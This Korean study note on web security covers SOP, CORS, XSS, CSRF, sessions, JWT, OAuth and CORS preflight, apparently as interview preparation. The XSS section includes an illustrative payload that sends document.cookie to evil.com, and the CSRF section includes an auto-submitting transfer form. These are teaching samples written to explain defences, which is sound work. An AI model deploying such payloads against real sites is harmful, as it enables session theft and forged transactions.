# 7주차 - Web Security / 인증

## 1. SOP (Same-Origin Policy)

- **동일 출처 정책:** 브라우저가 **한 출처(Origin)에서 로드된 문서/스크립트가 다른 출처의 리소스와 상호작용하는 것을 제한**하는 보안 정책
- 악성 사이트의 스크립트가 사용자의 브라우저를 이용해 **다른 사이트(은행, 메일 등)의 데이터를 몰래 읽어가는 것을 막기 위해** 존재
- 서버가 아니라 **브라우저가 강제하는 정책**

### 📍 Origin (출처)

- **Origin = Scheme(프로토콜) + Host(도메인) + Port** 세 가지가 모두 같아야 같은 출처

| 비교 대상 (`https://example.com` 기준) | 결과        | 이유                   |
| -------------------------------------- | ----------- | ---------------------- |
| `https://example.com/users`            | Same Origin | Path는 무관            |
| `http://example.com`                   | **Cross**   | Scheme 다름 (http)     |
| `https://api.example.com`              | **Cross**   | Host 다름 (서브도메인) |
| `https://example.com:8080`             | **Cross**   | Port 다름 (443 ↔ 8080) |

### 📍 SOP가 막는 것 / 막지 않는 것

| 구분               | 예시                                                                                   |
| ------------------ | -------------------------------------------------------------------------------------- |
| 허용 (Embedding)   | `<img>`, `<script src>`, `<link rel="stylesheet">`, `<video>`, `<iframe>`으로 **리소스를 삽입** |
| 허용 (Write)       | `<form>` 제출, 링크 이동, 리다이렉트 등 **요청을 보내는 것 자체**                       |
| 차단 (Read)        | `fetch`/`XMLHttpRequest`로 받은 **응답을 JS에서 읽는 것**                              |
| 차단 (DOM/Storage) | 다른 출처 iframe의 DOM 접근, 다른 출처의 Cookie·localStorage·IndexedDB 접근            |

- 즉 SOP는 **"요청을 보내는 것"이 아니라 "응답을 읽는 것"을 주로 막음** → 요청 자체는 서버에 도달할 수 있으므로 CSRF는 SOP만으로 막을 수 없음

### 💡 SOP가 없다면 어떤 문제가 생기나요?

**⇒ 사용자가 은행 사이트에 로그인한 상태로 악성 사이트에 접속하면, 악성 사이트의 스크립트가 `fetch("https://bank.com/account")`를 호출할 때 브라우저가 은행 쿠키를 자동으로 붙여 보내고 그 응답(계좌 정보)을 그대로 읽어 공격자 서버로 전송할 수 있게 됨. SOP는 다른 출처의 응답을 스크립트가 읽지 못하도록 막아 이런 정보 탈취를 방지함**

### 💡 같은 회사 서비스인데 `api.example.com`과 `www.example.com`은 왜 다른 출처인가요?

**⇒ 브라우저는 소유자가 누구인지 알 수 없고 오직 Scheme/Host/Port 문자열만 비교하기 때문. 서브도메인은 서로 다른 팀이나 외부 서비스(사용자 블로그 `user1.example.com` 등)가 운영할 수도 있어서 Host가 다르면 다른 출처로 취급함. 따라서 프론트와 API 서버의 서브도메인이 다르면 CORS 설정이 필요함**

---

## 2. CORS (Cross-Origin Resource Sharing)

- **SOP의 예외를 허용하는 메커니즘:** 서버가 HTTP 응답 헤더로 **"이 출처는 내 리소스를 읽어도 된다"고 브라우저에게 알려주는 방식**
- 프론트(`https://app.com`)와 API 서버(`https://api.app.com`)가 분리된 현대 웹 구조에서는 필수

### 📍 CORS 동작 방식

1. 브라우저가 Cross-Origin 요청 시 요청 헤더에 **`Origin: https://app.com`** 을 자동으로 붙여 전송
2. 서버가 응답에 **`Access-Control-Allow-Origin`** 등 CORS 헤더를 담아 응답
3. 브라우저가 응답 헤더를 확인해 **허용된 출처면 JS에 응답을 전달, 아니면 CORS 에러로 차단**

- 서버는 이미 요청을 처리하고 응답했으며, **브라우저가 JS에게 응답을 넘겨주지 않을 뿐**임

### 📍 CORS 요청의 종류

| 종류                       | 조건 / 설명                                                                                                    |
| -------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Simple Request             | `GET/HEAD/POST` + 기본 헤더만 사용 + `Content-Type`이 `text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded` 중 하나 → **바로 본 요청** |
| Preflight Request          | 위 조건을 벗어나면(`PUT/DELETE`, `application/json`, `Authorization` 헤더 등) **`OPTIONS`로 사전 확인 후 본 요청** |
| Credentialed Request       | 쿠키·인증 정보를 함께 보내는 요청 (`credentials: "include"` / `withCredentials: true`)                          |

### 📍 주요 CORS 응답 헤더

| 헤더                               | 설명                                                                  |
| ---------------------------------- | --------------------------------------------------------------------- |
| `Access-Control-Allow-Origin`      | 접근을 허용할 출처 (`https://app.com` 또는 `*`)                       |
| `Access-Control-Allow-Methods`     | 허용할 HTTP Method (Preflight 응답)                                   |
| `Access-Control-Allow-Headers`     | 허용할 요청 헤더 (Preflight 응답)                                     |
| `Access-Control-Allow-Credentials` | `true`면 쿠키 등 인증 정보를 포함한 요청의 응답을 JS에 노출           |
| `Access-Control-Max-Age`           | Preflight 결과를 캐싱할 시간(초)                                      |
| `Access-Control-Expose-Headers`    | JS에서 읽을 수 있도록 노출할 응답 헤더 (기본적으로 일부 헤더만 노출)  |

- **Credentialed Request에서는 `Access-Control-Allow-Origin: *`를 사용할 수 없고**, 반드시 **구체적인 출처**를 명시해야 함

```java
// Spring Boot CORS 설정 예시
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true); // 쿠키 허용 시 Origin에 * 사용 불가
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

### 💡 CORS 에러는 왜 Postman에서는 발생하지 않나요?

**⇒ CORS는 서버가 아니라 브라우저가 SOP를 지키기 위해 응답을 차단하는 정책이기 때문. Postman이나 curl, 서버 간 통신은 브라우저가 아니므로 SOP/CORS 검사를 하지 않아 응답을 그대로 받음. 따라서 CORS 에러는 프론트 코드로 우회하는 것이 아니라 서버가 올바른 CORS 헤더를 응답하도록 설정하거나, 같은 출처의 프록시를 두는 방식으로 해결해야 함**

### 💡 `Access-Control-Allow-Origin: *` 를 쓰면 안 되나요?

**⇒ 공개 API나 정적 리소스처럼 누구나 읽어도 되는 데이터라면 `*`도 괜찮지만, 인증이 필요한 API에서는 쿠키를 포함한 요청에 `*`를 쓸 수 없도록 브라우저가 막아둠. 그렇다고 요청의 `Origin` 값을 검증 없이 그대로 반사(reflect)해서 허용하면 모든 사이트가 인증된 응답을 읽을 수 있는 것과 같아 매우 위험하므로, 허용할 출처를 화이트리스트로 관리해야 함**

---

## 3. XSS (Cross-Site Scripting)

- 공격자가 **웹 페이지에 악성 스크립트를 삽입**해서 다른 사용자의 브라우저에서 실행되게 만드는 공격
- 스크립트가 **해당 사이트의 출처로 실행**되므로 SOP를 우회해 쿠키·토큰 탈취, 사용자 행세(요청 위조), 화면 변조, 피싱 페이지 삽입 등이 가능

### 📍 XSS의 종류

| 종류              | 설명                                                                                        | 예시                                   |
| ----------------- | ------------------------------------------------------------------------------------------- | -------------------------------------- |
| Stored XSS        | 악성 스크립트가 **DB에 저장**되어 해당 페이지를 보는 **모든 사용자**에게 실행               | 게시글/댓글에 `<script>` 삽입          |
| Reflected XSS     | URL 파라미터 등 **요청 값이 응답에 그대로 반영**되어 실행 (악성 링크 클릭 유도)             | `/search?q=<script>...</script>`       |
| DOM-based XSS     | 서버를 거치지 않고 **클라이언트 JS가 입력값을 DOM에 그대로 삽입**하면서 실행                | `el.innerHTML = location.hash`         |

```html
<!-- 댓글 내용이 이스케이프 없이 렌더링되면 -->
<img src="x" onerror="fetch('https://evil.com?c=' + document.cookie)" />
```

### 📍 XSS 방어 방법

| 방어 방법                   | 설명                                                                                      |
| --------------------------- | ----------------------------------------------------------------------------------------- |
| 출력 이스케이프 (Escaping)  | `<`, `>`, `"`, `'`, `&`를 `&lt;` 등 HTML 엔티티로 변환해 **문자열로만 출력**              |
| HTML Sanitize               | 리치 텍스트처럼 HTML을 허용해야 하면 **DOMPurify** 등으로 위험한 태그/속성 제거           |
| 안전한 API 사용             | `innerHTML` 대신 `textContent`, `dangerouslySetInnerHTML` 사용 최소화                     |
| CSP (Content Security Policy) | 응답 헤더로 **실행 가능한 스크립트 출처를 제한** (`script-src 'self'`, 인라인 스크립트 차단) |
| HttpOnly 쿠키               | XSS가 발생해도 **JS로 쿠키(세션 ID)를 읽을 수 없도록** 차단                               |
| 입력값 검증                 | URL은 `http/https` 스킴만 허용하는 등 **화이트리스트 기반 검증**                          |

- React/Vue는 JSX·템플릿에 넣는 값을 **기본적으로 이스케이프**하지만, `dangerouslySetInnerHTML`, `v-html`, `href={userInput}`(`javascript:` 스킴) 등은 여전히 위험함

### 💡 React를 쓰면 XSS로부터 안전한가요?

**⇒ React는 `{value}`로 렌더링하는 값을 자동으로 이스케이프해서 대부분의 XSS를 막아주지만 완전히 안전하지는 않음. `dangerouslySetInnerHTML`로 사용자 입력 HTML을 넣거나, `<a href={userUrl}>`에 `javascript:alert(1)` 같은 값이 들어가거나, `ref`로 DOM의 `innerHTML`을 직접 조작하면 XSS가 발생할 수 있음. 따라서 HTML 삽입 시에는 DOMPurify로 정제하고, URL은 스킴을 검증하며, CSP를 함께 적용하는 것이 좋음**

### 💡 HttpOnly 쿠키를 쓰면 XSS를 막을 수 있나요?

**⇒ HttpOnly는 JS가 `document.cookie`로 쿠키를 읽지 못하게 해서 세션 ID 탈취를 막아줄 뿐, XSS 자체를 막지는 못함. 악성 스크립트는 여전히 사용자의 브라우저에서 해당 사이트 출처로 실행되므로, 쿠키를 직접 읽지 않아도 `fetch`로 요청을 보내면 브라우저가 쿠키를 자동으로 붙여 사용자 권한으로 API를 호출할 수 있음. 따라서 HttpOnly는 피해를 줄이는 보조 수단이고, 근본적인 방어는 이스케이프·Sanitize·CSP임**

---

## 4. CSRF (Cross-Site Request Forgery)

- **사이트 간 요청 위조:** 사용자가 로그인한 상태를 악용해, **사용자의 의도와 무관하게 공격자가 원하는 요청을 보내도록** 만드는 공격
- 브라우저가 **요청 대상 사이트의 쿠키를 자동으로 첨부**하는 특성을 이용 → 서버는 정상 사용자의 요청으로 착각
- 공격자는 응답을 읽을 수 없지만(SOP), **송금·비밀번호 변경처럼 상태를 바꾸는 요청**은 실행시킬 수 있음

### 📍 CSRF 공격 흐름

1. 사용자가 `bank.com`에 로그인 → 브라우저에 **세션 쿠키 저장**
2. 사용자가 로그아웃하지 않은 상태로 공격자의 사이트 `evil.com` 방문
3. `evil.com`에 숨겨진 폼이 자동으로 `bank.com/transfer`에 요청 전송
4. 브라우저가 `bank.com`의 **쿠키를 자동으로 첨부** → 서버는 정상 요청으로 판단하고 송금 처리

```html
<!-- evil.com 페이지 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>
  document.getElementById("f").submit();
</script>
```

### 📍 CSRF 방어 방법

| 방어 방법                | 설명                                                                                              |
| ------------------------ | ------------------------------------------------------------------------------------------------- |
| SameSite 쿠키            | `SameSite=Lax/Strict`로 설정하면 **다른 사이트에서 시작된 요청에 쿠키를 보내지 않음**             |
| CSRF Token               | 서버가 발급한 **예측 불가능한 토큰**을 폼/헤더에 담아 보내고 서버가 검증 (공격자는 토큰을 모름)   |
| Double Submit Cookie     | 토큰을 쿠키와 요청 헤더(또는 바디)에 **둘 다 담아 보내고 값이 같은지** 비교                        |
| Origin / Referer 검증    | 요청의 `Origin`, `Referer` 헤더가 **허용된 출처인지** 확인                                        |
| 커스텀 헤더 요구         | `X-Requested-With` 같은 커스텀 헤더는 다른 출처에서 붙이면 Preflight가 발생하므로 CORS로 걸러짐   |
| 안전한 Method 사용       | **GET 요청으로 상태를 변경하지 않기** (`<img src>`로도 GET 요청은 쉽게 보낼 수 있음)               |
| 재인증                   | 송금·비밀번호 변경 등 중요한 동작은 **비밀번호 재입력, OTP** 요구                                 |

### 📍 XSS vs CSRF

| 구분        | XSS                                              | CSRF                                                   |
| ----------- | ------------------------------------------------ | ------------------------------------------------------ |
| 공격 대상   | **클라이언트(사용자 브라우저)** 에서 스크립트 실행 | **서버**가 위조된 요청을 정상 요청으로 처리            |
| 원리        | 사이트가 **입력값을 검증 없이 출력**하는 취약점  | 서버가 **요청이 사용자 의도인지 확인하지 않는** 취약점 |
| 응답 읽기   | 가능 (같은 출처로 실행되므로)                    | 불가능 (SOP), 요청만 보낼 수 있음                      |
| 방어        | 이스케이프, Sanitize, CSP                        | SameSite, CSRF Token, Origin 검증                      |

### 💡 JWT를 `Authorization` 헤더로 보내면 CSRF로부터 안전한가요?

**⇒ CSRF는 브라우저가 쿠키를 자동으로 첨부하는 특성을 이용하는 공격인데, `Authorization` 헤더는 JS가 직접 넣어야만 전송되므로 다른 사이트에서 위조한 요청에는 토큰이 포함되지 않아 CSRF에는 안전함. 하지만 토큰을 localStorage 등 JS로 접근 가능한 곳에 저장하면 XSS에 취약해지는 트레이드오프가 있음. 반대로 토큰을 쿠키에 저장하면 XSS 방어에는 유리하지만 다시 CSRF 방어(SameSite, CSRF Token)가 필요함**

### 💡 Spring Security에서 REST API는 왜 CSRF를 비활성화하나요?

**⇒ Spring Security의 CSRF 보호는 세션 쿠키 기반 인증을 전제로 하는데, JWT를 `Authorization` 헤더로 전달하는 Stateless API는 브라우저가 인증 정보를 자동으로 보내지 않으므로 CSRF 공격이 성립하지 않기 때문. 다만 인증 토큰을 쿠키로 주고받는 구조라면 CSRF가 다시 가능해지므로, 이 경우에는 CSRF 보호를 끄면 안 되고 SameSite 설정이나 CSRF Token을 적용해야 함**

---

## 5. 인증 / 인가

- **인증(Authentication):** 사용자가 **누구인지 확인**하는 과정 (로그인, "당신은 누구인가?")
- **인가(Authorization):** 인증된 사용자가 **특정 리소스에 접근할 권한이 있는지 확인**하는 과정 ("무엇을 할 수 있는가?")
- 항상 **인증이 먼저**, 그 다음 인가

### 📍 인증 vs 인가

| 구분         | 인증 (Authentication)                     | 인가 (Authorization)                          |
| ------------ | ----------------------------------------- | --------------------------------------------- |
| 질문         | 누구인가? (Who are you?)                  | 무엇을 할 수 있는가? (What can you do?)       |
| 예시         | ID/PW 로그인, 소셜 로그인, 생체 인증      | 관리자만 회원 삭제, 본인 글만 수정 가능       |
| 실패 시 응답 | **401 Unauthorized**                      | **403 Forbidden**                             |
| 관련 기술    | Session, JWT, OAuth 로그인, OIDC          | RBAC, ABAC, Spring Security `hasRole()`       |

### 📍 인증 방식의 종류

| 방식                | 설명                                                                     |
| ------------------- | ------------------------------------------------------------------------ |
| Session 기반        | 서버가 **세션 저장소에 로그인 상태를 저장**하고 세션 ID를 쿠키로 전달    |
| Token 기반 (JWT)    | 서버가 서명한 **토큰을 발급**하고, 클라이언트가 매 요청마다 토큰을 전달  |
| OAuth / 소셜 로그인 | 구글·카카오 등 **외부 서비스에 인증을 위임**                             |
| MFA (다중 인증)     | 비밀번호 + OTP/SMS/생체 정보 등 **두 가지 이상의 요소**로 인증           |

### 📍 인가 모델

| 모델                                | 설명                                                                               |
| ----------------------------------- | ---------------------------------------------------------------------------------- |
| RBAC (Role-Based Access Control)    | **역할(Role)** 에 권한을 부여하고, 사용자에게 역할을 할당 (`ADMIN`, `USER`)        |
| ABAC (Attribute-Based Access Control) | 사용자·리소스·환경의 **속성(Attribute)** 을 조합해 판단 (작성자 본인, 근무 시간 등) |
| ACL (Access Control List)           | 리소스마다 **접근 가능한 사용자/권한 목록**을 관리                                 |

### 💡 프론트에서 권한에 따라 버튼을 숨기면 인가가 된 건가요?

**⇒ 프론트에서 버튼이나 메뉴를 숨기는 것은 사용자 경험을 위한 처리일 뿐 보안 장치가 아님. 사용자는 개발자 도구나 curl로 API를 직접 호출할 수 있으므로, 실제 인가 검사는 반드시 서버에서 요청마다 수행해야 함. 특히 `/posts/{id}` 수정 API에서 로그인 여부만 확인하고 작성자 본인인지 확인하지 않으면 다른 사람의 글을 수정할 수 있는 IDOR 취약점이 생김**

---

## 6. Cookie / Session

### 📍 Cookie

- 서버가 `Set-Cookie` 헤더로 내려주면 **브라우저가 저장**하고, 이후 **같은 도메인으로 요청할 때마다 자동으로 `Cookie` 헤더에 담아 전송**하는 작은 데이터 (도메인당 약 4KB)
- Stateless한 HTTP에서 **상태를 유지**하기 위한 수단

```http
HTTP/1.1 200 OK
Set-Cookie: SESSIONID=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600

GET /mypage HTTP/1.1
Cookie: SESSIONID=abc123
```

| 구분          | 설명                                                                    |
| ------------- | ----------------------------------------------------------------------- |
| Session Cookie | `Expires`/`Max-Age`가 없어 **브라우저를 닫으면 삭제**                  |
| Persistent Cookie | 만료 시간이 지정되어 **브라우저를 닫아도 유지** (자동 로그인 등)    |
| First-party / Third-party | 현재 사이트의 쿠키 / 다른 사이트(광고, 트래킹)의 쿠키 → 3rd-party 쿠키는 점차 차단되는 추세 |

### 📍 Session

- **사용자 상태(로그인 정보 등)를 서버에 저장**하고, 클라이언트에는 이를 찾기 위한 **세션 ID만 쿠키로 전달**하는 방식

1. 사용자가 ID/PW로 로그인 요청
2. 서버가 인증 후 **세션 저장소에 사용자 정보를 저장**하고 세션 ID 발급
3. `Set-Cookie: SESSIONID=...` 로 세션 ID를 브라우저에 전달
4. 이후 요청마다 브라우저가 쿠키로 세션 ID 전송 → 서버가 **세션 저장소에서 조회해 사용자 식별**
5. 로그아웃 시 **서버에서 세션 삭제** → 즉시 무효화

### 📍 Cookie vs Session

| 구분        | Cookie                                   | Session                                          |
| ----------- | ---------------------------------------- | ------------------------------------------------ |
| 저장 위치   | **클라이언트(브라우저)**                 | **서버** (메모리, Redis, DB)                     |
| 보안        | 사용자가 조회·변조 가능 → 민감 정보 X    | 서버에 있어 상대적으로 안전 (세션 ID 탈취는 주의) |
| 용량        | 약 4KB 제한                              | 서버 자원이 허용하는 만큼                        |
| 서버 부하   | 없음                                     | 사용자 수만큼 **저장 공간·조회 비용** 발생       |
| 만료 제어   | 만료 시간 지정                           | 서버가 **즉시 무효화** 가능                      |

### 📍 서버가 여러 대일 때 세션 문제

- 서버 A에 로그인해서 세션이 A의 메모리에 저장되면, 다음 요청이 서버 B로 가면 **세션이 없어 로그인이 풀림**

| 해결 방법                    | 설명                                                                 | 단점                                       |
| ---------------------------- | -------------------------------------------------------------------- | ------------------------------------------ |
| Sticky Session               | 로드밸런서가 **같은 사용자를 항상 같은 서버로** 라우팅              | 특정 서버에 부하 집중, 서버 장애 시 세션 유실 |
| Session Clustering           | 서버끼리 **세션을 복제**해 공유                                     | 서버가 늘수록 복제 비용 증가               |
| 세션 저장소 분리 (Redis)     | 모든 서버가 **외부 저장소(Redis)** 에서 세션 조회                    | 저장소가 단일 장애 지점이 될 수 있음 (클러스터링 필요) |

### 💡 세션 ID가 탈취되면 어떻게 되나요? (Session Hijacking)

**⇒ 서버는 세션 ID만으로 사용자를 식별하므로 공격자가 세션 ID를 얻으면 비밀번호 없이 그 사용자로 행세할 수 있음. 이를 막기 위해 세션 쿠키에 `HttpOnly`(XSS로 탈취 방지), `Secure`(HTTPS에서만 전송), `SameSite`를 설정하고, 로그인 성공 시 세션 ID를 새로 발급해 Session Fixation 공격을 막으며, 세션 만료 시간을 적절히 짧게 두는 것이 좋음**

---

## 7. JWT (JSON Web Token)

- 사용자 정보와 권한 등을 **JSON 형태로 담고 서명(Signature)한 토큰**
- 서버가 상태를 저장하지 않고 **토큰의 서명만 검증해 사용자를 식별**할 수 있는 **Stateless 인증** 방식
- 보통 `Authorization: Bearer <token>` 헤더로 전송

### 📍 JWT 구조

- **`Header.Payload.Signature`** 세 부분을 **Base64URL 인코딩**한 뒤 `.`으로 연결

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6IlVTRVIiLCJleHAiOjE3MzAwMDAwMDB9.4Xk3...
       Header                              Payload                              Signature
```

| 구성      | 내용                                                                                     |
| --------- | ---------------------------------------------------------------------------------------- |
| Header    | 토큰 타입(`typ: JWT`)과 **서명 알고리즘**(`alg: HS256`, `RS256`)                         |
| Payload   | 사용자 정보와 메타데이터인 **Claim** (`sub`, `exp`, `iat`, `role` 등)                    |
| Signature | `Header + Payload`를 **비밀키(또는 개인키)로 서명**한 값 → 위·변조 여부 검증에 사용      |

| 주요 Claim | 설명                         |
| ---------- | ---------------------------- |
| `iss`      | 토큰 발급자 (Issuer)         |
| `sub`      | 토큰 주체 (보통 사용자 ID)   |
| `aud`      | 토큰 대상자 (Audience)       |
| `exp`      | **만료 시간** (Expiration)   |
| `iat`      | 발급 시간 (Issued At)        |
| `jti`      | 토큰 고유 ID (블랙리스트 등) |

### 📍 서명 알고리즘

| 구분     | HS256 (대칭키)                                  | RS256 / ES256 (비대칭키)                                       |
| -------- | ----------------------------------------------- | -------------------------------------------------------------- |
| 키       | 서명과 검증에 **같은 비밀키** 사용              | **개인키로 서명**, **공개키로 검증**                           |
| 장점     | 빠르고 간단                                     | 검증하는 서버들은 공개키만 가지면 됨 (키 유출 위험 감소)       |
| 적합한 곳 | 단일 서버, 발급자 = 검증자                     | MSA, 외부 서비스가 토큰을 검증해야 하는 경우 (OAuth/OIDC)      |

### 📍 Session vs JWT

| 구분          | Session                                   | JWT                                                 |
| ------------- | ----------------------------------------- | --------------------------------------------------- |
| 상태 저장     | **서버**에 저장 (Stateful)                | **토큰 자체**에 정보 포함 (Stateless)               |
| 확장성        | 세션 저장소 공유 필요                     | 서명만 검증하면 되므로 **수평 확장에 유리**          |
| 요청 크기     | 세션 ID만 전송 (작음)                     | 토큰에 Claim이 담겨 **상대적으로 큼**               |
| 강제 만료     | 서버에서 세션 삭제로 **즉시 무효화**      | 만료 전까지 **유효** → 블랙리스트 등 별도 처리 필요 |
| 탈취 시 피해  | 세션 삭제로 대응 가능                     | 만료 시간까지 악용 가능                             |

### 📍 Access Token + Refresh Token

- JWT는 한 번 발급하면 **만료 전까지 무효화하기 어려우므로**, 수명을 둘로 나눠 관리

| 구분          | Access Token                         | Refresh Token                                         |
| ------------- | ------------------------------------ | ----------------------------------------------------- |
| 용도          | API 요청 시 **인증**                 | Access Token이 만료되면 **재발급**받는 용도           |
| 수명          | **짧게** (15분 ~ 1시간)              | **길게** (2주 ~ 1달)                                  |
| 저장 위치(서버) | 저장하지 않음 (서명만 검증)        | **DB/Redis에 저장**해서 로그아웃·강제 만료 시 삭제    |

- **Refresh Token Rotation:** 재발급 시 Refresh Token도 **새로 발급하고 이전 것은 폐기** → 탈취된 Refresh Token이 재사용되면 감지해서 전체 무효화

### 💡 JWT의 Payload에 비밀번호 같은 민감 정보를 넣으면 안 되는 이유

**⇒ JWT의 Payload는 암호화가 아니라 Base64URL로 인코딩만 되어 있어서 누구나 디코딩해 내용을 볼 수 있기 때문. 서명은 "내용이 변조되지 않았음"을 보장할 뿐 내용을 숨겨주지 않음. 따라서 Payload에는 사용자 ID, 권한처럼 노출되어도 괜찮은 최소한의 정보만 넣고, 내용 자체를 숨겨야 한다면 JWE(암호화된 JWT)를 사용해야 함**

### 💡 JWT는 로그아웃을 어떻게 처리하나요?

**⇒ JWT는 서버가 상태를 저장하지 않아 발급된 토큰을 서버에서 바로 무효화할 수 없음. 그래서 Access Token의 만료 시간을 짧게 두고, 로그아웃 시 서버에 저장된 Refresh Token을 삭제해 재발급을 막으며, 즉시 차단이 필요하면 로그아웃된 Access Token을 남은 만료 시간 동안 Redis 블랙리스트에 저장해 검사함. 다만 블랙리스트를 매 요청마다 조회하면 결국 상태를 저장하는 것이므로 Stateless의 장점이 일부 줄어드는 트레이드오프가 있음**

---

## 8. OAuth

- **OAuth 2.0:** 사용자가 비밀번호를 제3자 서비스에 직접 알려주지 않고, **특정 리소스에 대한 접근 권한(Access Token)을 위임**하는 **인가(Authorization) 프레임워크**
- 예시: "카카오로 로그인" 시 내 서비스는 카카오 비밀번호를 모른 채 카카오가 발급한 토큰으로 사용자의 프로필에 접근

### 📍 OAuth 2.0의 구성 요소

| 역할                         | 설명                                                    | 예시 (카카오 로그인)      |
| ---------------------------- | ------------------------------------------------------- | ------------------------- |
| Resource Owner               | 리소스의 소유자 = **사용자**                            | 카카오 계정을 가진 사용자 |
| Client                       | 사용자 대신 리소스에 접근하려는 **애플리케이션**        | 내 서비스                 |
| Authorization Server         | 사용자를 인증하고 **토큰을 발급**하는 서버              | 카카오 인증 서버          |
| Resource Server              | 사용자 리소스를 가지고 있고 **토큰을 검증해 제공**하는 서버 | 카카오 API 서버       |

### 📍 Grant Type (권한 부여 방식)

| Grant Type                   | 설명                                                                         | 상태                              |
| ---------------------------- | ---------------------------------------------------------------------------- | --------------------------------- |
| Authorization Code           | 인가 코드를 받은 뒤 **서버에서 토큰으로 교환** (가장 일반적이고 안전)         | 권장 (+ PKCE)                     |
| Client Credentials           | 사용자 없이 **서버 간 통신**에서 클라이언트 자격으로 토큰 발급              | 권장 (M2M)                        |
| Refresh Token                | Refresh Token으로 **Access Token 재발급**                                    | 사용                              |
| Implicit                     | 인가 코드 없이 **URL로 토큰을 바로 전달**                                    | **사용 비권장** (토큰 노출 위험)  |
| Resource Owner Password      | 사용자의 ID/PW를 **클라이언트가 직접 받아** 토큰 발급                         | **사용 비권장**                   |

### 📍 Authorization Code Flow

```
User           Client              Auth Server          Resource Server
 │                │                     │                      │
 │ (1) click      │                     │                      │
 │───────────────▶│                     │                      │
 │ (2) redirect   │                     │                      │
 │◀───────────────│                     │                      │
 │ (3) login      │                     │                      │
 │─────────────────────────────────────▶│                      │
 │ (4) ?code=     │                     │                      │
 │◀─────────────────────────────────────│                      │
 │ (5) send code  │                     │                      │
 │───────────────▶│                     │                      │
 │                │ (6) code+secret     │                      │
 │                │────────────────────▶│                      │
 │                │ (7) access token    │                      │
 │                │◀────────────────────│                      │
 │                │ (8) user info request                      │
 │                │───────────────────────────────────────────▶│
 │                │ (9) user info       │                      │
 │                │◀───────────────────────────────────────────│
 │ (10) token     │                     │                      │
 │◀───────────────│                     │                      │
 │                │                     │                      │
```

1. 사용자가 **"카카오로 로그인" 버튼 클릭**
2. Client가 사용자를 **카카오 로그인 페이지(authorize URL)로 리다이렉트**
3. 사용자가 카카오에서 **로그인 + 정보 제공 동의**
4. 카카오가 **`redirect_uri?code=AUTH_CODE`로 리다이렉트** (인가 코드 전달)
5. 브라우저가 받은 **인가 코드를 Client(백엔드)로 전달**
6. Client가 **`code` + `client_secret`으로 토큰 요청**
7. 카카오가 **Access Token (+ Refresh Token) 발급**
8. Client가 **Access Token으로 사용자 정보 요청**
9. Resource Server가 **사용자 정보 응답**
10. Client가 회원가입/로그인 처리 후 **자체 서비스 토큰(JWT/세션) 발급**

### 📍 OAuth 2.0 vs OIDC (OpenID Connect)

| 구분     | OAuth 2.0                                 | OIDC                                                      |
| -------- | ----------------------------------------- | --------------------------------------------------------- |
| 목적     | **인가** (리소스 접근 권한 위임)          | OAuth 2.0 위에 **인증** 계층을 추가                       |
| 결과물   | Access Token                              | Access Token + **ID Token(JWT, 사용자 신원 정보)**        |
| 질문     | "이 앱이 내 정보에 접근해도 되나?"        | "이 사용자는 누구인가?"                                   |

- 소셜 로그인은 엄밀히 말하면 **인증**이 목적이므로, OAuth로 받은 Access Token으로 사용자 정보를 조회하거나 **OIDC의 ID Token**을 사용함

### 💡 Authorization Code를 한 번 거치는 이유 (바로 토큰을 주지 않는 이유)

**⇒ 리다이렉트는 브라우저 URL을 통해 전달되므로 브라우저 히스토리, Referer 헤더, 로그 등에 노출될 위험이 있음. 그래서 URL로는 수명이 매우 짧고 한 번만 쓸 수 있는 인가 코드만 전달하고, 실제 토큰 교환은 백엔드 서버가 `client_secret`과 함께 Authorization Server와 직접 통신(Back Channel)해서 받아오도록 해 토큰이 브라우저에 노출되지 않게 함. 공격자가 코드를 가로채도 `client_secret`(또는 PKCE의 `code_verifier`)이 없으면 토큰으로 교환할 수 없음**

### 💡 OAuth는 인증인가요, 인가인가요?

**⇒ OAuth 2.0은 본래 "제3자 앱에게 내 리소스 접근 권한을 위임"하기 위한 인가 프레임워크이고, Access Token에는 "누구인지"에 대한 표준 정보가 정의되어 있지 않음. 소셜 로그인처럼 인증 목적으로 쓰려면 Access Token으로 사용자 정보 API를 호출해 신원을 확인하거나, OAuth 위에 인증 계층을 표준화한 OIDC를 사용해 서명된 ID Token으로 사용자를 식별함**

---

# Frontend 심화

## 1. Preflight

- 브라우저가 **Simple Request가 아닌 Cross-Origin 요청**을 보내기 전에, 서버가 이 요청을 허용하는지 **`OPTIONS` Method로 미리 확인하는 요청**
- 서버가 CORS를 모르는 레거시 서버일 경우, 예상치 못한 `PUT/DELETE` 요청이 **실제로 실행되어 상태가 바뀌는 것을 막기 위해** 존재

### 📍 Preflight가 발생하는 조건

- Method가 `GET`, `HEAD`, `POST` **외의 것** (`PUT`, `PATCH`, `DELETE`)
- `Content-Type`이 `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` **외의 것** (예: **`application/json`**)
- **CORS-safelisted 헤더 외의 헤더**를 추가한 경우 (예: **`Authorization`**, `X-Custom-Header`)

### 📍 Preflight 요청 / 응답

```http
# 1. Preflight 요청 (브라우저가 자동으로 전송)
OPTIONS /api/users HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type

# 2. Preflight 응답
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600

# 3. 허용되면 본 요청 전송
PUT /api/users HTTP/1.1
Origin: https://app.com
Authorization: Bearer ...
```

